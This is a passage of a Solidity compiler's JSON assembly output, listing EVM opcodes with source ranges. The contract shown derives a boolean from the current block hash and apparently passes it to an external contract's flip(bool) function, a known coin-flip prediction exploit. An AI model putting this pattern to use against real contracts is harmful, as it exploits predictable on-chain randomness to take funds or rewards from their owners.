											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 152,
											"end": 180,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 152,
											"end": 180,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "PUSH",
											"source": 1,
											"value": "FF"
										},
										{
											"begin": 187,
											"end": 207,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 187,
											"end": 207,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 266,
											"end": 273,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 285,
											"end": 305,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 326,
											"end": 338,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 316,
											"end": 339,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 308,
											"end": 340,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 308,
											"end": 340,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 285,
											"end": 340,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 285,
											"end": 340,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 367,
											"end": 462,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 384,
											"end": 461,
											"name": "PUSH",
											"source": 1,
											"value": "8000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 367,
											"end": 379,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 367,
											"end": 383,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 367,
											"end": 383,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 367,
											"end": 462,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 367,
											"end": 462,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 367,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 367,
											"end": 462,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 367,
											"end": 462,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 367,
											"end": 462,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 367,
											"end": 462,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 351,
											"end": 364,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 351,
											"end": 462,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 351,
											"end": 462,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 351,
											"end": 462,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 351,
											"end": 462,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 505,
											"end": 506,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 488,
											"end": 501,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 488,
											"end": 501,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 488,
											"end": 506,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 488,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 516,
											"end": 521,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 488,
											"end": 521,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 509,
											"end": 513,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 488,
											"end": 521,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 477,
											"end": 485,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 477,
											"end": 485,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 477,
											"end": 521,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 477,
											"end": 521,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "PUSH",
											"source": 1,
											"value": "FF"
										},
										{
											"begin": 477,
											"end": 521,
											"name": "MUL",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "MUL",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "OR",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 477,
											"end": 521,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 274,
											"end": 533,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 214,
											"end": 533,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 623,
											"end": 633,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 645,
											"end": 654,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 623,
											"end": 655,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 623,
											"end": 655,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 676,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 681,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 675,
											"end": 681,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 675,
											"end": 681,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 682,
											"end": 690,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 682,
											"end": 690,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 682,
											"end": 690,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 682,
											"end": 690,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 682,
											"end": 690,
											"name": "PUSH",
											"source": 1,
											"value": "FF"
										},
										{
											"begin": 682,
											"end": 690,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 675,
											"end": 691,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 675,
											"end": 691,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 666,
											"end": 691,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 666,
											"end": 691,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 701,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 582,
											"end": 701,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 539,
											"end": 701,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 4027,
											"end": 4034,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 4058,
											"end": 4059,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4055,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 4047,
											"end": 4059,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 4047,
											"end": 4059,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 84,
											"name": "tag",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 7,
											"end": 84,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 73,
											"end": 78,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 62,
											"end": 78,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 62,
											"end": 78,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 7,
											"end": 84,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 7,
											"end": 84,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 90,
											"end": 208,
											"name": "tag",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 90,
											"end": 208,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "54"
										},
										{
											"begin": 195,
											"end": 200,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 3,
											"value": "54"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 172,
											"end": 175,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 165,
											"end": 202,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 90,
											"end": 208,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 214,
											"end": 436,
											"name": "tag",
											"source": 3,
											"value": "10"
										},
										{
											"begin": 214,
											"end": 436,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 307,
											"end": 311,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 345,
											"end": 347,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 334,
											"end": 343,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 330,
											"end": 348,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 322,
											"end": 348,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 322,
											"end": 348,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 426,
											"end": 427,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 415,
											"end": 424,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 411,
											"end": 428,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 402,
											"end": 408,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 358,
											"end": 429,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 358,
											"end": 429,
											"name": "tag",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 358,
											"end": 429,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 214,
											"end": 436,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 442,
											"end": 532,
											"name": "tag",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 442,
											"end": 532,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 476,
											"end": 483,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 519,
											"end": 524,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 512,
											"end": 525,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 505,
											"end": 526,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 494,
											"end": 526,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 494,
											"end": 526,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 442,
											"end": 532,
											"name": "SWAP2",
